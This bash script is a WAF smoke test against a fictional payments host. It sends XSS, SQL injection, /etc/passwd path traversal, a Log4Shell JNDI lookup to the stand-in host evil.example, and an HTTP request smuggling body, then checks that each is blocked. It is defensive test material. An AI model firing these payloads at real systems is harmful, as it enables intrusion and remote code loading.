#!/usr/bin/env bash
# Simplest possible check that the wslproxy WAF is blocking on
# payments-secure.fictionally.org — pure curl, no Python, no deps.
#
# Fires a few attacks (incl. HTTP request smuggling) plus one benign control and
# asserts the secure host returns 403 + `X-WAF-Block: true` on attacks and 200 on
# the benign request. Exits 0 only if every check passes.
#
#   ./test-secure.sh                                   # default secure host
#   ./test-secure.sh https://payments-secure.fictionally.org
set -u

HOST="${1:-https://payments-secure.fictionally.org}"
HOST="${HOST%/}"
UA="waf-secure-smoke/1.0"
pass=0; fail=0

# Fire a request, print raw response headers. Args: METHOD PATH [BODY]
fire() {
  local method="$1" path="$2" body="${3:-}"
  if [ -n "$body" ]; then
    printf '%b' "$body" | curl -sS -m 20 -o /dev/null -D - -A "$UA" \
      -H 'Content-Type: text/plain' -X "$method" --data-binary @- "$HOST$path"
  else
    curl -sS -m 20 -o /dev/null -D - -A "$UA" -X "$method" "$HOST$path"
  fi
}

# check NAME EXPECT(block|allow) METHOD PATH [BODY]
check() {
  local name="$1" expect="$2"; shift 2
  local hdrs code blocked
  hdrs="$(fire "$@")"
  code="$(printf '%s' "$hdrs" | awk 'NR==1{print $2}')"
  blocked=no
  if [ "$code" = "403" ] && printf '%s' "$hdrs" | grep -qi '^x-waf-block:[[:space:]]*true'; then
    blocked=yes
  fi
  local rule; rule="$(printf '%s' "$hdrs" | awk -F': *' 'tolower($1)=="x-waf-rule"{print $2}' | tr -d '\r')"
  local ok=FAIL
  if { [ "$expect" = block ] && [ "$blocked" = yes ]; } ||
     { [ "$expect" = allow ] && [ "$blocked" = no ] && [ "$code" = 200 ]; }; then
    ok=PASS; pass=$((pass+1))
  else
    fail=$((fail+1))
  fi
  printf '  [%s] %-26s expect=%-5s status=%s%s\n' \
    "$ok" "$name" "$expect" "${code:-000}" "${rule:+  rule=$rule}"
}

echo "── WAF smoke test → $HOST"

# GET attacks — payloads are pre-URL-encoded so they survive the query string
# on any curl version.
check "XSS <script>"        block GET "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
check "SQLi UNION"          block GET "/products?cat=x'%20UNION%20SELECT%20*%20FROM%20users--"
check "Path traversal"      block GET "/statement?file=../../../../../../etc/passwd"
check "Log4Shell JNDI"      block GET "/lookup?user=\${jndi:ldap://evil.example/a}"

# HTTP request smuggling — a second request line pipelined in the body.
check "HTTP req smuggling"  block POST "/api/batch" \
  '{"batch":"noop"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n'

# Benign control — must pass through (200, no block).
check "Benign request"      allow GET "/products?cat=deposit"

echo "──────────────────────────────────────────────"
echo "  $pass passed, $fail failed  ($HOST)"
[ "$fail" -eq 0 ]
